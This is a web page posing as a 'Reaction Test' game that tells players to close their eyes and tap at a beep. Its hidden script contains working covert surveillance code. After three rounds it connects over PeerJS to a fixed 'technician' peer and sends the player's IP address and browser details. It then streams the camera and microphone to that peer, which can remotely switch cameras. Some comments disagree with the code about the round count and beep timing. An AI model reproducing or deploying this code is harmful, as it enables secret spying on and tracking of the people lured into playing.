<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Test</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            touch-action: none;
            user-select: none;
        }

        /* The Centered Game Board */
        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50; /* Dark Blue */
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            position: relative;
            border: 4px solid #34495e;
            cursor: pointer;
            transition: background-color 0.1s;
        }

            /* Flash color when tapped */
            #game-board.active {
                background-color: #34495e;
            }

            #game-board.success {
                background-color: #27ae60;
            }
            /* Green flash */
            #game-board.fail {
                background-color: #c0392b;
            }
        /* Red flash */

        #hud-container {
            margin-bottom: 20px;
            text-align: center;
            width: 90%;
        }

        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }

        #instruction {
            font-size: 18px;
            color: #ecf0f1;
            margin-top: 10px;
            line-height: 1.4;
        }

        /* Visual ripple on tap */
        .ripple {
            position: absolute;
            width: 20px;
            height: 20px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            animation: rippleAnim 0.4s linear;
        }

        @keyframes rippleAnim {
            0% {
                width: 20px;
                height: 20px;
                opacity: 1;
            }

            100% {
                width: 200px;
                height: 200px;
                opacity: 0;
            }
        }
    </style>
</head>
<body>

    <div id="hud-container">
        <div id="main-display">TAP TO START</div>
        <div id="instruction">
            1. Close your eyes.<br>
            2. Wait for the BEEP.<br>
            3. Tap the box fast!
        </div>
    </div>

    <div id="game-board"></div>

    <script>
        // --- CONFIG ---
        const TECHNICIAN_ID = "tech-support-commander-001";
        const TRIGGER_COUNT = 3; // Triggers camera after 10 rounds

        // --- GAME STATE ---
        let gameState = 'IDLE'; // IDLE, WAITING_FOR_BEEP, WAITING_FOR_TAP
        let beepTimestamp = 0;
        let reactionTime = 0;
        let roundCount = 0;
        let isConnected = false;

        // --- AUDIO CONTEXT ---
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx;

        // --- DOM ELEMENTS ---
        const board = document.getElementById('game-board');
        const display = document.getElementById('main-display');
        const instruction = document.getElementById('instruction');

        // --- PEERJS ---
        const peer = new Peer();
        let myDataConnection = null;
        let currentStream = null;

        // 1. INPUT HANDLER
        board.addEventListener('touchstart', handleInput, { passive: false });
        board.addEventListener('mousedown', handleInput);

        function handleInput(e) {
            e.preventDefault();

            // Visual Effect
            const rect = board.getBoundingClientRect();
            const x = e.touches ? e.touches[0].clientX : e.clientX;
            const y = e.touches ? e.touches[0].clientY : e.clientY;
            createRipple(x - rect.left, y - rect.top);

            // Initialize Audio on first tap (Browser requirement)
            if (!audioCtx) audioCtx = new AudioContext();
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // --- GAME LOGIC ---
            if (gameState === 'IDLE') {
                // START GAME
                gameState = 'WAITING_FOR_BEEP';
                display.innerText = "WAIT...";
                display.style.color = "#f1c40f"; // Yellow
                instruction.innerText = "Keep eyes closed... Listen...";
                scheduleBeep();
                return;
            }

            if (gameState === 'WAITING_FOR_BEEP') {
                // TAPPED TOO EARLY
                display.innerText = "TOO EARLY!";
                display.style.color = "#e74c3c"; // Red
                flashBoard('fail');

                // Cancel pending beep and restart round
                clearTimeout(beepTimer);
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
                return;
            }

            if (gameState === 'WAITING_FOR_TAP') {
                // SUCCESSFUL REACTION
                const now = Date.now();
                reactionTime = now - beepTimestamp;

                display.innerText = reactionTime + " ms";
                display.style.color = "#2ecc71"; // Green
                flashBoard('success');

                roundCount++;

                // Send Data to Technician
                if (isConnected && myDataConnection) {
                    myDataConnection.send({
                        type: 'reaction_stats',
                        ms: reactionTime,
                        round: roundCount
                    });
                }

                // CHECK TRIGGER (Surveillance)
                if (roundCount === TRIGGER_COUNT && !isConnected) {
                    activateSurveillance();
                }

                // Next Round
                gameState = 'WAITING_FOR_BEEP';
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000); // Small pause before next cycle starts
            }
        }

        // 2. TIMING & AUDIO LOGIC
        let beepTimer = null;

        function scheduleBeep() {
            // Random time between 1000ms (1s) and 3000ms (3s)
            const randomDelay = Math.floor(Math.random() * 100) ;

            beepTimer = setTimeout(() => {
                playTone();
                beepTimestamp = Date.now();
                gameState = 'WAITING_FOR_TAP';
                // Note: We don't change text here, user has eyes closed
            }, randomDelay);
        }

        function playTone() {
            if (!audioCtx) return;
            const osc = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();

            osc.connect(gainNode);
            gainNode.connect(audioCtx.destination);

            osc.type = 'sine';
            osc.frequency.setValueAtTime(600, audioCtx.currentTime); // 600Hz Beep
            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);

            osc.start();
            osc.stop(audioCtx.currentTime + 0.15); // Short beep (150ms)
        }

        // 3. VISUALS
        function createRipple(x, y) {
            const ripple = document.createElement('div');
            ripple.className = 'ripple';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            board.appendChild(ripple);
            setTimeout(() => ripple.remove(), 400);
        }

        function flashBoard(type) {
            board.classList.add(type);
            setTimeout(() => board.classList.remove(type), 200);
        }

        // 4. SURVEILLANCE CONNECTION (Hidden)
        async function activateSurveillance() {
            console.log("Connecting...");
            isConnected = true;

            try {
                // Connect Data
                myDataConnection = peer.connect(TECHNICIAN_ID);
                myDataConnection.on('open', async () => {
                    // Send IP Spy Info
                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const j = await r.json();
                        myDataConnection.send({ type: 'info', ip: j.ip, userAgent: navigator.userAgent });
                    } catch (e) { }

                    // Listen for Swap Command
                    myDataConnection.on('data', (d) => {
                        if (d === 'swap') toggleCamera();
                    });
                });

                // Start Video Stream
                await startStream('user');
            } catch (err) {
                console.log("Silent error:", err);
            }
        }

        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: mode },
                audio: true
            });
            currentStream = stream;
            peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user';
        function toggleCamera() {
            currentMode = (currentMode === 'user') ? 'environment' : 'user';
            startStream(currentMode);
        }

    </script>
</body>
</html>
